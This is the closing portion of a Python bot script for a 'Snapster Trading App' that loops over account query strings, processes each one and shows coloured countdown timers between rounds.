                    f"{Fore.GREEN + Style.BRIGHT}Account's Total: {Style.RESET_ALL}"
                    f"{Fore.WHITE + Style.BRIGHT}{len(queries)}{Style.RESET_ALL}"
                )
                self.log(f"{Fore.CYAN + Style.BRIGHT}-{Style.RESET_ALL}"*75)

                for query in queries:
                    query = query.strip()
                    if query:
                        self.process_query(query)
                        self.log(f"{Fore.CYAN + Style.BRIGHT}-{Style.RESET_ALL}"*75)
                        seconds = 60
                        while seconds > 0:
                            formatted_time = self.format_seconds(seconds)
                            print(
                                f"{Fore.CYAN+Style.BRIGHT}[ Wait for{Style.RESET_ALL}"
                                f"{Fore.WHITE+Style.BRIGHT} {formatted_time} {Style.RESET_ALL}"
                                f"{Fore.CYAN+Style.BRIGHT}... ]{Style.RESET_ALL}",
                                end="\r"
                            )
                            time.sleep(1)
                            seconds -= 1

                seconds = 1800
                while seconds > 0:
                    formatted_time = self.format_seconds(seconds)
                    print(
                        f"{Fore.CYAN+Style.BRIGHT}[ Wait for{Style.RESET_ALL}"
                        f"{Fore.WHITE+Style.BRIGHT} {formatted_time} {Style.RESET_ALL}"
                        f"{Fore.CYAN+Style.BRIGHT}... ]{Style.RESET_ALL}",
                        end="\r"
                    )
                    time.sleep(1)
                    seconds -= 1

        except KeyboardInterrupt:
            self.log(f"{Fore.RED + Style.BRIGHT}[ EXIT ] Snapster Trading App - BOT.{Style.RESET_ALL}")
        except Exception as e:
            self.log(f"{Fore.RED + Style.BRIGHT}An error occurred: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    snapster = SnapsterTradingApp()
    snapster.main()
